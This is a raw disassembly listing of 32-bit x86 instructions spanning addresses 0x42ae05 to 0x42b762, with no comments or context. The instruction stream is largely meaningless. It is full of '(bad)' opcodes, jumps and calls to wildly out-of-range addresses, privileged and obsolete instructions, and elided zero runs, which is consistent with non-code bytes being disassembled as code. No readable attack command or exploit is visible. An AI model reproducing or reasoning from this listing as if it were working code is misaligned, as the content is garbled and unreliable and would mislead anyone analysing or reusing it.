  42ae05:	bound  esp,QWORD PTR [eax+eax*1+0x2]
  42ae09:	jp     0x42adca
  42ae0b:	push   0xffffffdf
  42ae0d:	shl    eax,0x10
  42ae10:	(bad)  
  42ae11:	rcl    DWORD PTR [eax+0x53],0x37
  42ae15:	and    bh,dh
  42ae17:	jne    0x42adfe
  42ae19:	mov    bl,0x15
  42ae1b:	fs enter 0x46,0x85
  42ae20:	popf   
  42ae21:	xor    eax,0xacf08314
  42ae26:	cli    
  42ae27:	push   cs
  42ae28:	dec    ecx
  42ae29:	enter  0x0,0x9d
  42ae2d:	xchg   DWORD PTR [ebp-0x4],edi
  42ae30:	cdq    
  42ae31:	add    eax,DWORD PTR [edi+ecx*1-0x76fff974]
  42ae38:	jae    0x42ae6b
  42ae3a:	add    DWORD PTR [eax],eax
  42ae3c:	popf   
  42ae3d:	add    ebp,DWORD PTR [edi-0x50fc72a3]
  42ae43:	(bad)  
  42ae44:	push   ss
  42ae45:	in     al,dx
  42ae46:	jmp    0x42ae5b
  42ae48:	dec    ebp
  42ae49:	push   es
  42ae4a:	shl    eax,0x4d
  42ae4d:	(bad)  
  42ae4e:	mov    edx,0x8342250
  42ae53:	mov    DWORD PTR [eax],eax
	...
  42ae6d:	jo     0x42ae21
  42ae6f:	bound  esp,QWORD PTR [eax]
  42ae71:	adc    dh,BYTE PTR [eax+ecx*1]
  42ae74:	dec    DWORD PTR [edx]
  42ae76:	sub    edi,DWORD PTR [ebx+0x7d]
  42ae79:	dec    ebp
  42ae7a:	add    DWORD PTR [ebp+0x23],esi
  42ae7d:	ja     0x42ae85
  42ae7f:	sub    al,al
  42ae81:	mov    dl,0xe8
  42ae84:	cmc    
  42ae85:	mov    DWORD PTR [eax],0xd1a8ff00
  42ae8b:	push   es
  42ae8c:	mov    bh,0xcd
  42ae8e:	adc    bh,dh
  42ae90:	jne    0x42aeab
  42ae92:	mov    bl,0x75
  42ae94:	or     BYTE PTR ds:0xf4fff665,ah
  42ae9a:	mov    dl,0x2f
  42ae9c:	jmp    0x428adf
  42aea1:	sti    
  42aea2:	or     ah,bh
  42aea4:	cli    
  42aea5:	imul   edx,esp,0x92ea54e7
  42aeab:	ror    BYTE PTR [ecx-0x8814bc7],cl
  42aeb1:	in     al,dx
  42aeb2:	rol    BYTE PTR [edx-0x240aef],cl
  42aeb8:	or     dh,BYTE PTR [eax-0x80]
  42aebb:	(bad)  
  42aebc:	push   esp
  42aebe:	pop    esi
  42aebf:	(bad)  
  42aec0:	(bad)  
  42aec1:	jmp    0x7edb:0xf4009157
  42aec8:	div    edi
  42aeca:	(bad)  
  42aecb:	dec    edx
  42aecc:	jg     0x42ae6d
  42aece:	loopne 0x42af1b
  42aed0:	push   ebp
	...
  42aee9:	add    BYTE PTR [ecx-0x6a],ch
  42aeec:	fnstcw WORD PTR [edi-0x73]
  42aeef:	fmul   QWORD PTR [edx+0x44]
  42aef2:	leave  
  42aef3:	jl     0x42aef4
  42aef5:	push   esp
  42aef7:	scas   eax,DWORD PTR es:[edi]
  42aef8:	and    al,0x3d
  42aefa:	push   esi
  42aefb:	(bad)  
  42aefd:	(bad)  
  42aefe:	call   0xf4e1c7d4
  42af03:	(bad)  
  42af05:	jae    0x42af1a
  42af07:	fstp   DWORD PTR [edi+0x4bdbf400]
  42af0d:	sub    BYTE PTR [ecx],dl
  42af0f:	inc    ecx
  42af10:	(bad)  
  42af11:	push   esp
  42af13:	push   0xdca3e95b
  42af18:	(bad)  
  42af19:	jmp    FWORD PTR [edi-0x60]
  42af1c:	pop    es
  42af1d:	data16 cmc 
  42af1f:	jne    0x42af20
  42af21:	gs hlt 
  42af23:	outs   dx,BYTE PTR ds:[esi]
  42af24:	rcl    BYTE PTR ds:0x3faf28,cl
  42af2a:	les    eax,FWORD PTR [ecx+edx*8]
  42af2d:	cmp    edx,DWORD PTR [eax]
  42af2f:	leave  
  42af30:	fimul  DWORD PTR [ecx+0x375decb1]
  42af36:	add    cl,cl
  42af38:	push   esp
  42af39:	and    al,0xab
  42af3b:	fstp   TBYTE PTR [edx*8-0x5d033711]
  42af42:	hlt    
  42af43:	add    al,0xe9
  42af45:	dec    esi
  42af46:	in     eax,dx
  42af47:	pop    edx
  42af48:	jmp    0x1c0b8eb6
  42af4d:	or     al,0x0
	...
  42af67:	(bad)  [edx]
  42af69:	fsub   QWORD PTR [ebx+0x4ee904f4]
  42af6f:	jecxz  0x42afcb
  42af71:	jmp    0x941f6ddf
  42af76:	pop    ss
  42af77:	xchg   ebx,eax
  42af78:	add    eax,0xea2103e9
  42af7d:	xor    BYTE PTR [esp+eiz*4+0x5],ah
  42af81:	jmp    0xf267d15a
  42af86:	mov    WORD PTR [ebp+esi*1+0x4f4f1d1],?
  42af8d:	jmp    0x4a3fb966
  42af92:	lods   eax,DWORD PTR ds:[esi]
  42af93:	pop    ds
  42af94:	daa    
  42af95:	sahf   
  42af96:	retf   0xe9b2
  42af99:	call   0xe94840b4
  42af9e:	add    ebp,edi
  42afa0:	cmp    BYTE PTR [ebx],0x4
  42afa3:	hlt    
  42afa4:	add    al,0xe4
  42afa6:	mov    ds:0xe8e904f4,al
  42afab:	jne    0x42afb7
  42afad:	inc    esi
  42afae:	add    al,0xf4
  42afb0:	add    al,0x95
  42afb2:	jbe    0x42afad
  42afb4:	mov    eax,ds:0xf7f403e9
  42afb9:	fs scas eax,DWORD PTR es:[edi]
  42afbb:	hlt    
  42afbc:	add    al,0x0
  42afbe:	jmp    0xe94355cd
  42afc3:	not    DWORD PTR [ecx-0x36]
  42afc6:	jb     0x42af92
  42afc8:	cld    
  42afc9:	gs call 0x42afcf
	...
  42afe3:	add    BYTE PTR [eax],ah
  42afe5:	push   edx
  42afe6:	adc    BYTE PTR [ebx-0x8],al
  42afe9:	aaa    
  42afea:	sti    
  42afeb:	hlt    
  42afec:	sub    esi,ecx
  42afee:	aas    
  42afef:	jmp    0xc3068d1b
  42aff4:	ror    bl,0xe7
  42aff7:	jl     0x42b003
  42aff9:	addr16 add cl,ch
  42affc:	idiv   ebx
  42affe:	test   dh,ah
  42b000:	test   al,0xcb
  42b002:	sti    
  42b003:	jb     0x42b00f
  42b005:	stc    
  42b006:	repnz sub DWORD PTR [eax*1+0x50f7eb00],edx
  42b00e:	call   0x9ce9:0xd4d741
  42b015:	cmp    BYTE PTR [edi+0x72],0xee
  42b019:	push   eax
  42b01a:	cmp    bl,dh
  42b01c:	jno    0x42b05b
  42b01e:	sti    
  42b01f:	data16 test al,0x47
  42b022:	idiv   eax
  42b024:	and    DWORD PTR [edi+0x5393527f],edx
  42b02a:	sbb    ch,BYTE PTR [edx-0x64]
  42b02d:	icebp  
  42b02e:	or     ch,BYTE PTR [ecx+eax*1-0x34]
  42b032:	sti    
  42b033:	add    ah,BYTE PTR ds:[edi+0x0]
  42b037:	jmp    0xeac7ac33
  42b03c:	inc    eax
  42b03d:	retf   
  42b03e:	sti    
  42b03f:	popa   
  42b040:	ja     0x42b017
  42b042:	add    cl,ch
  42b044:	pop    esi
  42b045:	aaa    
  42b046:	sti    
  42b047:	push   ss
	...
  42b060:	add    BYTE PTR [eax],ch
  42b062:	or     DWORD PTR [esi+0xb04f7e9],ebx
  42b068:	add    BYTE PTR [eax+0x2afff6e1],ah
  42b06e:	fnsave [esi]
  42b070:	jmp    FWORD PTR [edx]
  42b072:	mov    bl,0xb9
  42b074:	dec    DWORD PTR [edx]
  42b076:	add    al,BYTE PTR [eax]
  42b078:	cmp    eax,0x7f
  42b07d:	mov    al,ds:0x194582e9
  42b082:	inc    esi
  42b083:	inc    eax
  42b084:	and    al,0x74
  42b086:	add    BYTE PTR [eax],al
  42b088:	add    ebp,ebx
  42b08a:	add    eax,DWORD PTR [edi+esi*1+0x25f7b2aa]
  42b091:	int    0x2
  42b093:	add    BYTE PTR [ecx],al
  42b095:	mov    ds:0xc0c01399,al
  42b09a:	mov    dl,0x0
  42b09c:	add    ch,bl
  42b09e:	std    
  42b09f:	das    
  42b0a0:	lock int 0x2
  42b0a3:	pop    es
  42b0a4:	mov    bh,0x8d
  42b0a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b0a7:	or     eax,0x1403d
  42b0ac:	add    BYTE PTR [edx+0x2aff147d],bl
  42b0b2:	mov    dl,0x83
  42b0b4:	shl    ebx,0x7b
  42b0b7:	ror    BYTE PTR [edi],0x21
  42b0ba:	enter  0xfff6,0x2a
  42b0be:	pop    ebx
  42b0bf:	xor    eax,ecx
  42b0c1:	call   0x0:0xfee77d
	...
  42b0dc:	add    BYTE PTR [eax],al
  42b0de:	sub    dh,BYTE PTR [edx-0x4e028a09]
  42b0e4:	jne    0x42b0ee
  42b0e6:	inc    edi
  42b0e7:	aaa    
  42b0e8:	jmp    0xf7f4dcdb
  42b0ed:	push   ebp
  42b0ee:	(bad)  
  42b0ef:	in     al,0x7b
  42b0f1:	in     al,dx
  42b0f2:	cmp    DWORD PTR [edi],ecx
  42b0f4:	dec    esi
  42b0f5:	mov    ebp,ebp
  42b0f7:	inc    ebp
  42b0f8:	ds adc ah,dh
  42b0fb:	xchg   BYTE PTR [edx],dl
  42b0fd:	sti    
  42b0fe:	ins    DWORD PTR es:[edi],dx
  42b0ff:	jns    0x42b0d4
  42b101:	(bad)  
  42b102:	in     eax,dx
  42b103:	inc    ebx
  42b104:	hlt    
  42b105:	add    ah,dh
  42b107:	fist   DWORD PTR [ebx+0x26]
  42b10a:	sub    bl,BYTE PTR [ecx-0x535fff09]
  42b110:	jp     0x42b157
  42b112:	in     al,0x52
  42b114:	inc    eax
  42b115:	or     al,0x7f
  42b117:	mov    ss,edi
  42b119:	aas    
  42b11a:	jmp    FWORD PTR [esi-0x1c6e8032]
  42b120:	shl    edx,1
  42b122:	cmp    esp,edx
  42b124:	add    esi,DWORD PTR [ebx+ebx*1+0x32]
  42b128:	add    eax,0xaacb4b53
  42b12d:	call   0xfc1142cd
  42b132:	fistp  QWORD PTR [ecx-0x23037f86]
  42b138:	(bad)  
  42b139:	jmp    FWORD PTR [ebp+0x18]
  42b13c:	fdiv   DWORD PTR [edi]
  42b13e:	mov    bl,0xf0
  42b140:	or     BYTE PTR [ecx+0x0],cl
	...
  42b15a:	add    BYTE PTR [ecx],dh
  42b15c:	js     0x42b138
  42b15e:	adc    BYTE PTR [ebx-0x76],al
  42b161:	mov    edi,0x9e83b287
  42b166:	test   al,0xf4
  42b168:	(bad)  
  42b16a:	mov    dl,0xb4
  42b16c:	push   esp
  42b16d:	dec    eax
  42b16e:	in     al,0x7f
  42b170:	popf   
  42b171:	out    dx,eax
  42b172:	xchg   BYTE PTR [ecx],dh
  42b174:	loopne 0x42b1f0
  42b176:	pop    ebp
  42b177:	in     al,dx
  42b178:	fs ja  0x42b17b
  42b17b:	cmc    
  42b17c:	(bad)  
  42b17e:	xchg   BYTE PTR [edx+0x44d7aab],dh
  42b184:	gs ja  0x42b18b
  42b187:	cmc    
  42b188:	(bad)  
  42b18a:	xor    eax,DWORD PTR ss:[edx+esi*8]
  42b18e:	xchg   esi,ecx
  42b190:	add    ch,cl
  42b192:	add    ebp,DWORD PTR [ebp+0x27]
  42b195:	sbb    DWORD PTR [esi+0x57e7d4d1],eax
  42b19b:	clc    
  42b19c:	pop    edx
  42b19d:	call   0x2711a880
  42b1a2:	pop    es
  42b1a3:	test   al,0xfa
  42b1a5:	cdq    
  42b1a6:	xchg   ebx,eax
  42b1a7:	cmc    
  42b1a8:	jns    0x42b1c5
  42b1aa:	fistp  DWORD PTR [edx+0x7d03e99c]
  42b1b0:	daa    
  42b1b1:	int    0x85
  42b1b3:	cdq    
  42b1b4:	fmul   DWORD PTR [ecx]
  42b1b6:	pop    eax
  42b1b7:	lock pop edx
  42b1b9:	call   0xa6fda89a
  42b1be:	inc    esp
	...
  42b1d7:	add    BYTE PTR [eax+0xf],ah
  42b1da:	adc    dl,BYTE PTR [eax+edi*8+0x2edca38f]
  42b1e1:	ins    DWORD PTR es:[edi],dx
  42b1e2:	jmp    0x91a52eea
  42b1e7:	test   DWORD PTR [ecx-0x53],edx
  42b1ea:	icebp  
  42b1eb:	push   edi
  42b1ec:	clc    
  42b1ed:	cs call 0xa6fda8cf
  42b1f3:	hlt    
  42b1f4:	daa    
  42b1f5:	bndldx bnd2,[edx+ebp*4-0x2d235471]
  42b1fd:	ins    BYTE PTR es:[edi],dx
  42b1fe:	jmp    0xd98e2506
  42b203:	rol    BYTE PTR [ecx+ecx*1-0x18],1
  42b207:	add    esi,esp
  42b209:	xchg   ecx,eax
  42b20a:	mov    ah,0xcb
  42b20c:	jg     0x42b283
  42b20e:	jmp    0xbf47a615
  42b213:	addr16 int 0xac
  42b216:	dec    eax
  42b217:	jle    0x42b288
  42b219:	les    ebp,FWORD PTR [esi-0x34]
  42b21c:	jnp    0x42b268
  42b21e:	add    BYTE PTR [ecx],dh
  42b220:	jno    0x42b1e7
  42b222:	repnz pusha 
  42b224:	ret    
  42b225:	sar    BYTE PTR [edi+0x21],0xfd
  42b229:	aaa    
  42b22a:	xor    al,0x93
  42b22c:	daa    
  42b22d:	pop    eax
  42b22e:	sti    
  42b22f:	cld    
  42b230:	cmp    ebx,DWORD PTR [ecx]
  42b232:	inc    eax
  42b233:	jmp    0xe942b7c6
  42b238:	mov    bh,0x38
  42b23a:	and    al,0x40
	...
  42b254:	add    al,bh
  42b256:	add    al,0xc0
  42b258:	jmp    0x186286f5
  42b25d:	add    esi,edx
  42b25f:	je     0x42b25f
  42b261:	outs   dx,BYTE PTR ds:[esi]
  42b262:	add    eax,0x3a77e500
  42b267:	adc    BYTE PTR [esi],bh
  42b269:	and    eax,0x37faf01a
  42b26e:	add    eax,0xa43a985
  42b273:	mov    DWORD PTR [esp+eax*8],esp
  42b276:	mov    edi,eax
  42b278:	ins    BYTE PTR es:[edi],dx
  42b279:	les    edi,FWORD PTR [eax]
  42b27b:	sub    eax,0xa414b016
  42b280:	jmp    0x15831f7c
  42b285:	sbb    esp,edi
  42b287:	jl     0x42b226
  42b289:	and    ebx,DWORD PTR [edx]
  42b28b:	jmpw   0x727b
  42b28f:	adc    eax,0x3a37d
  42b294:	adc    esi,edi
  42b296:	sub    al,BYTE PTR [eax]
  42b298:	sbb    DWORD PTR [ecx],ebx
  42b29a:	loopne 0x42b284
  42b29c:	dec    edi
  42b29d:	mov    esi,0x322efbbf
  42b2a2:	mov    ebp,0x4f7e901
  42b2a7:	out    0xad,eax
  42b2a9:	clc    
  42b2aa:	popa   
  42b2ab:	hlt    
  42b2ac:	mov    al,fs:0x8e003d38
  42b2b2:	aam    0x15
  42b2b4:	loopne 0x42b2ff
  42b2b6:	inc    edi
  42b2b7:	add    BYTE PTR [ebp+0x0],al
	...
  42b2d1:	add    BYTE PTR ds:0x22851c5c,cl
  42b2d7:	pop    esp
  42b2d8:	add    bh,BYTE PTR [ebx]
  42b2da:	mov    dl,0x5b
  42b2dc:	(bad)  
  42b2dd:	cmc    
  42b2de:	cwde   
  42b2df:	stos   DWORD PTR es:[edi],eax
  42b2e0:	push   DWORD PTR [ebx+0x53]
  42b2e3:	ds pop ebp
  42b2e5:	cld    
  42b2e6:	fimul  DWORD PTR [edx-0x8]
  42b2e9:	add    DWORD PTR ds:0xf68b0007,ebx
  42b2ef:	loopne 0x42b2ff
  42b2f1:	and    DWORD PTR [eax+0x1d8000bf],0xa70d7407
  42b2fb:	or     DWORD PTR [edx+0x0],esp
  42b2fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b2ff:	or     BYTE PTR [ebx],ch
  42b301:	(bad)  ds:0xc2fff8f9
  42b307:	mov    edi,?
  42b309:	mulps  xmm0,XMMWORD PTR [edx]
  42b30c:	add    DWORD PTR [eax],eax
  42b30e:	int    0x85
  42b310:	inc    ebp
  42b311:	test   al,0xfd
  42b313:	stc    
  42b314:	mov    esi,0x157545
  42b319:	add    ch,bl
  42b31b:	rcl    DWORD PTR ds:0x46bef4,cl
  42b321:	test   DWORD PTR [ebp-0x63ca803e],ecx
  42b327:	push   es
  42b328:	add    BYTE PTR [edi],cl
  42b32a:	jmp    0xc4b:0xea0f0ff3
  42b331:	shr    DWORD PTR [esi-0x47],0x2
  42b335:	fadd   DWORD PTR [eax]
	...
  42b34f:	push   ds
  42b350:	push   esp
  42b351:	clc    
  42b352:	add    DWORD PTR [eax-0x5817b115],ebp
  42b358:	add    BYTE PTR [bx+si],al
  42b35b:	hlt    
  42b35c:	and    DWORD PTR [esp+esi*2],0xfffffff8
  42b360:	es (bad) 
  42b362:	out    0x8,eax
  42b364:	aaa    
  42b365:	dec    ecx
  42b366:	adc    BYTE PTR [edi],cl
  42b368:	imul   edi,DWORD PTR [edi+0x76f4a30b],0x49070045
  42b372:	mov    esp,0xaf41335
  42b377:	mov    ebp,esp
  42b379:	div    bh
  42b37b:	dec    edi
  42b37c:	scas   eax,DWORD PTR es:[edi]
  42b37d:	jbe    0x42b3fc
  42b37f:	cld    
  42b380:	cs push ecx
  42b382:	lock hlt 
  42b384:	aas    
  42b385:	std    
  42b386:	dec    esi
  42b387:	retf   
  42b388:	xchg   ebx,eax
  42b389:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b38a:	add    ah,dh
  42b38c:	stos   DWORD PTR es:[edi],eax
  42b38d:	push   edi
  42b38e:	add    esi,esi
  42b390:	stos   DWORD PTR es:[edi],eax
  42b391:	jmp    esi
  42b393:	out    0xe1,al
  42b395:	dec    eax
  42b396:	or     al,bh
  42b398:	push   edi
  42b399:	icebp  
  42b39a:	dec    esi
  42b39b:	mov    ds:0xf4009e43,eax
  42b3a0:	stos   DWORD PTR es:[edi],eax
  42b3a1:	push   edi
  42b3a2:	(bad)  
  42b3a3:	cmc    
  42b3a4:	stos   DWORD PTR es:[edi],eax
  42b3a5:	(bad)  
  42b3a6:	cli    
  42b3a7:	imul   eax,esp,0x1b8c4580
  42b3ad:	retf   
  42b3ae:	jne    0x42b380
  42b3b0:	(bad)
	...
  42b3cc:	push   ds
  42b3cd:	addr16 retf 0x77fb
  42b3d1:	and    al,ah
  42b3d3:	add    BYTE PTR [eax-0x56],al
  42b3d6:	cs push ebx
  42b3d8:	sbb    al,0x4b
  42b3da:	(bad)  
  42b3db:	push   esp
  42b3dd:	adc    eax,DWORD PTR [ebx]
  42b3df:	(bad)  
  42b3e0:	mov    ds:0xa20ed6ab,eax
  42b3e5:	lock sti 
  42b3e7:	aas    
  42b3e8:	or     cl,dl
  42b3ea:	cs push ebx
  42b3ec:	sbb    al,0x5
  42b3ee:	xchg   ecx,eax
  42b3ef:	add    esi,esp
  42b3f1:	add    al,0xd1
  42b3f3:	sti    
  42b3f4:	jns    0x42b3b7
  42b3f6:	jmp    0x5cff9dc9
  42b3fb:	dec    eax
  42b3fc:	pushf  
  42b3fd:	push   esp
  42b3fe:	inc    edx
  42b3ff:	pop    eax
  42b400:	pusha  
  42b401:	lea    esp,[ebx]
  42b403:	fisttp DWORD PTR [ebx-0x42]
  42b406:	xor    cl,dh
  42b408:	sar    DWORD PTR [edi],cl
  42b40a:	inc    ecx
  42b40b:	add    eax,eax
  42b40d:	adc    dh,BYTE PTR [esi-0x169733ca]
  42b413:	add    esi,esp
  42b415:	sub    al,0xed
  42b417:	add    esp,esi
  42b419:	add    al,0xfe
  42b41b:	lock and eax,0xa7f3f147
  42b421:	pop    ds
  42b422:	xchg   esi,eax
  42b423:	mov    WORD PTR ss:[edi-0x17],fs
  42b427:	add    esi,esp
  42b429:	sub    al,0xe4
  42b42b:	add    esp,esi
  42b42d:	add    al,0xe2
  42b42f:	push   edi
	...
  42b448:	add    ah,bh
  42b44a:	mov    fs,WORD PTR [esp+ebx*4]
  42b44d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b44e:	rcr    DWORD PTR [eax+edx*8+0x7b],0xc7
  42b453:	rcl    DWORD PTR [eax-0x293d3f1e],0x39
  42b45a:	or     eax,0x53f957e8
  42b45f:	sbb    bl,BYTE PTR [esp+edx*4+0x5]
  42b463:	jmp    0xe748106b
  42b468:	add    esi,esp
  42b46a:	mov    edi,0x4a69cc14
  42b46f:	inc    ecx
  42b470:	xor    al,0xaf
  42b472:	cmp    cl,BYTE PTR [ebp+0x60adb679]
  42b478:	retf   0xc09f
  42b47b:	jb     0x42b4c4
  42b47d:	in     al,dx
  42b47e:	add    al,0x0
  42b480:	loope  0x42b479
  42b482:	add    al,0x74
  42b484:	(bad)  
  42b485:	sub    eax,0xfd292e05
  42b48a:	retf   0x5e8
  42b48d:	push   edx
  42b48e:	add    eax,0x5288e600
  42b493:	adc    al,0xde
  42b495:	add    ch,0x4f
  42b498:	sub    BYTE PTR [edi+0x15],dl
  42b49b:	pop    es
  42b49c:	xor    DWORD PTR [edi],esp
  42b49e:	sub    eax,0x4f7eb06
  42b4a3:	sti    
  42b4a4:	mov    ah,0x3b
  42b4a6:	mov    esp,0x451515
  42b4ab:	add    BYTE PTR [esi+0x0],bh
	...
  42b4c5:	add    BYTE PTR [ecx],cl
  42b4c7:	pop    eax
  42b4c8:	leave  
  42b4c9:	sub    ebp,DWORD PTR [eax]
  42b4cb:	shl    ch,0xe4
  42b4ce:	xlat   BYTE PTR ds:[ebx]
  42b4cf:	fidivr DWORD PTR [edi]
  42b4d1:	jmp    0x1161edd1
  42b4d6:	mov    ds:0x7be900c3,al
  42b4db:	lds    esi,FWORD PTR [ebx+edx*8-0x74]
  42b4df:	adc    DWORD PTR [eax],ebp
  42b4e1:	lds    esi,FWORD PTR [esp+eax*1+0x976960b]
  42b4e8:	add    ecx,ebp
  42b4ea:	test   DWORD PTR [ebx],0x5f760b3
  42b4f0:	add    cl,ch
  42b4f2:	mov    dh,0xa4
  42b4f4:	adc    dl,dh
  42b4f6:	mov    dh,0x7f
  42b4f8:	sti    
  42b4f9:	or     al,0xa8
  42b4fb:	sbb    BYTE PTR [eax-0x17],al
  42b4fe:	mov    eax,ds:0x34c72009
  42b503:	add    eax,0xace81504
  42b508:	fs scas al,BYTE PTR es:[edi]
  42b50a:	test   DWORD PTR [esp+eax*4],0x86ec43a9
  42b511:	add    cl,dl
  42b513:	in     al,dx
  42b514:	add    eax,DWORD PTR [ebp-0x74e4a8b3]
  42b51a:	cwde   
  42b51b:	sbb    ebx,esp
  42b51d:	inc    ebx
  42b51e:	popf   
  42b51f:	cmp    al,0x89
  42b521:	add    BYTE PTR [ebx+eax*1+0x3c858900],cl
  42b528:	or     eax,0x28
	...
  42b541:	add    BYTE PTR [eax],al
  42b543:	sub    DWORD PTR [ebp+0x0],eax
  42b546:	mov    edx,esp
  42b548:	pop    es
  42b549:	add    DWORD PTR [eax],eax
  42b54b:	dec    ebp
  42b54c:	cmp    cl,BYTE PTR [eax+0x4]
  42b54f:	pop    esi
  42b550:	ret    
  42b551:	inc    eax
  42b552:	ret    0x361
  42b555:	sub    eax,eax
  42b557:	mov    dh,0xca
  42b559:	mul    DWORD PTR ds:0x3bb7b9
  42b55f:	jecxz  0x42b567
  42b561:	and    dh,bl
  42b563:	pop    esi
  42b564:	add    eax,DWORD PTR [esp+esi*2]
  42b567:	imul   ebx,ebx,0x1d
  42b56a:	(bad)  
  42b56b:	or     eax,0xa1c08403
  42b570:	out    0xa0,al
  42b572:	sub    cl,ch
  42b574:	inc    esp
  42b575:	add    BYTE PTR [ebx-0x76fc1897],cl
  42b57b:	test   DWORD PTR [eax],ecx
  42b57d:	add    DWORD PTR [eax],eax
  42b57f:	or     eax,0xd524443e
  42b584:	aas    
  42b585:	or     eax,0x469928
  42b58a:	mov    DWORD PTR [ebp+eax*1+0x1],ecx
  42b58e:	add    ch,cl
  42b590:	pop    ss
  42b591:	rol    BYTE PTR [eax-0x61],0xc1
  42b595:	sti    
  42b596:	(bad)  
  42b597:	lock or BYTE PTR [eax+eax*2],dl
  42b59b:	int    0xd4
  42b59d:	add    eax,0x467b20
  42b5a2:	add    al,0xf4
  42b5a4:	cli    
  42b5a5:	sub    eax,0x53
	...
  42b5be:	add    BYTE PTR [eax],al
  42b5c0:	and    cl,ch
  42b5c2:	fcmovnu st,st(5)
  42b5c4:	mov    edx,0xb483ffac
  42b5c9:	mov    eax,0xd0308703
  42b5ce:	out    dx,eax
  42b5cf:	xor    BYTE PTR cs:[ebx-0x57],0x75
  42b5d4:	jmp    0xc794e756
  42b5d9:	inc    edx
  42b5da:	xchg   BYTE PTR [eax],bl
  42b5dc:	push   eax
  42b5dd:	imul   edi,edi,0xffffffe7
  42b5e0:	sti    
  42b5e1:	push   esi
  42b5e2:	(bad)  
  42b5e3:	sti    
  42b5e4:	ret    
  42b5e5:	sub    bh,BYTE PTR gs:[esi+0x15c6abf0]
  42b5ec:	hlt    
  42b5ed:	fdivr  QWORD PTR [edi]
  42b5ef:	add    BYTE PTR [edx+0x43f87a9a],ah
  42b5f5:	ror    ebx,0x14
  42b5f8:	mov    ah,0xab
  42b5fa:	or     bh,al
  42b5fc:	test   eax,0xc35231b0
  42b601:	add    ch,BYTE PTR [edi-0x56eccbd1]
  42b607:	pop    ebx
  42b608:	mov    edx,0x1c25c662
  42b60d:	fstp   TBYTE PTR [edi]
  42b60f:	add    BYTE PTR [edx],al
  42b611:	test   eax,0xabb7da1f
  42b616:	sti    
  42b617:	jae    0x42b5ce
  42b619:	rol    DWORD PTR [ecx+0x7babf4c2],cl
  42b61f:	shl    BYTE PTR [eax+0x14],0xc7
  42b623:	adc    eax,0x0
	...
  42b63c:	add    ah,dh
  42b63e:	fdivr  QWORD PTR [edi]
  42b640:	add    BYTE PTR [edi-0x50],ch
  42b643:	pop    ss
  42b644:	fdiv   QWORD PTR [edi]
  42b646:	lods   al,BYTE PTR ds:[esi]
  42b647:	or     al,0x81
  42b649:	clc    
  42b64a:	lods   al,BYTE PTR ds:[esi]
  42b64b:	(bad)  
  42b64c:	dec    DWORD PTR [ecx+0x5]
  42b64f:	add    BYTE PTR [edi],dh
  42b651:	es repnz test al,0x33
  42b655:	inc    esp
  42b656:	push   ebp
  42b657:	(bad)  
  42b658:	scas   al,BYTE PTR es:[edi]
  42b659:	outs   dx,BYTE PTR ds:[esi]
  42b65a:	sbb    al,0xad
  42b65c:	inc    esi
  42b65d:	hlt    
  42b65e:	lods   al,BYTE PTR ds:[esi]
  42b65f:	dec    edi
  42b660:	rcr    DWORD PTR [edi+0x2ec3b6bd],1
  42b666:	inc    ebp
  42b667:	push   cs
  42b668:	(bad)  
  42b669:	adc    cl,BYTE PTR [eax]
  42b66b:	push   0xfffffff0
  42b66d:	(bad)  
  42b66e:	adc    ch,BYTE PTR [ecx+0x26c4cb03]
  42b674:	retf   0xa919
  42b677:	std    
  42b678:	inc    ebx
  42b679:	hlt    
  42b67a:	mov    dh,0xe4
  42b67c:	and    edi,DWORD PTR [esi]
  42b67e:	inc    ecx
  42b67f:	jmp    0xae7b7c83
  42b684:	fisttp DWORD PTR [ecx]
  42b686:	(bad)  
  42b687:	jmp    0xb607268f
  42b68c:	inc    ebp
  42b68d:	aas    
  42b68e:	pop    ss
  42b68f:	jmp    0x6e47b288
  42b694:	clc    
  42b695:	fneni(8087 only) 
  42b697:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b698:	add    ebp,ebp
  42b69a:	sbb    ebp,0x4
  42b69d:	hlt    
  42b69e:	add    al,0x7c
  42b6a0:	and    DWORD PTR [eax],eax
	...
  42b6ba:	jae    0x42b72f
  42b6bc:	icebp  
  42b6bd:	add    al,0xf4
  42b6bf:	add    al,0x6c
  42b6c1:	rol    DWORD PTR [eax-0x16356d1c],1
  42b6c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b6c8:	std    
  42b6c9:	inc    ebx
  42b6ca:	hlt    
  42b6cb:	xchg   DWORD PTR [ecx+0x3958094f],ebp
  42b6d1:	xor    al,0x44
  42b6d3:	clc    
  42b6d4:	lods   eax,DWORD PTR ds:[esi]
  42b6d5:	mov    bh,ah
  42b6d7:	fsub   DWORD PTR [esi]
  42b6d9:	add    al,0xcc
  42b6db:	inc    esp
  42b6dc:	mov    bl,0xc9
  42b6de:	iret   
  42b6df:	pusha  
  42b6e0:	add    dl,bh
  42b6e2:	mov    bh,0x5f
  42b6e4:	mov    edi,0xbf5fb662
  42b6e9:	inc    edi
  42b6ea:	lods   eax,DWORD PTR ds:[esi]
  42b6eb:	loop   0x42b6e8
  42b6ed:	cli    
  42b6ee:	aaa    
  42b6ef:	add    eax,0xd4157f
  42b6f4:	add    BYTE PTR ds:0xcd7c3bef,dl
  42b6fa:	fwait
  42b6fb:	mov    edi,0xb712bb74
  42b700:	je     0x42b6c9
  42b702:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b703:	add    ah,BYTE PTR [eax]
  42b705:	(bad)  
  42b706:	cmp    DWORD PTR ds:0xacdadd04,eax
  42b70c:	enter  0xf824,0x4
  42b710:	test   BYTE PTR [ecx],ch
  42b712:	les    ebx,FWORD PTR [eax]
  42b714:	mov    eax,ds:0xfffc8c01
  42b719:	jno    0x42b78b
  42b71b:	add    eax,0xe901
	...
  42b734:	add    BYTE PTR [eax],al
  42b736:	add    bh,dh
  42b738:	lea    eax,[edx-0x23]
  42b73b:	xchg   esi,eax
  42b73c:	in     eax,dx
  42b73d:	fld    TBYTE PTR [edx-0x127f7c09]
  42b743:	test   BYTE PTR [eax+eax*1],0x70
  42b747:	mov    dh,0x1c
  42b749:	mov    esi,0x8756f7ed
  42b74e:	xchg   ebp,eax
  42b74f:	add    ecx,DWORD PTR ds:0xe0c40653
  42b755:	pop    ss
  42b756:	inc    bl
  42b758:	loopne 0x42b771
  42b75a:	idiv   BYTE PTR [ebx+0x2c9717e0]
  42b760:	adc    ah,ah
  42b762:	cli    
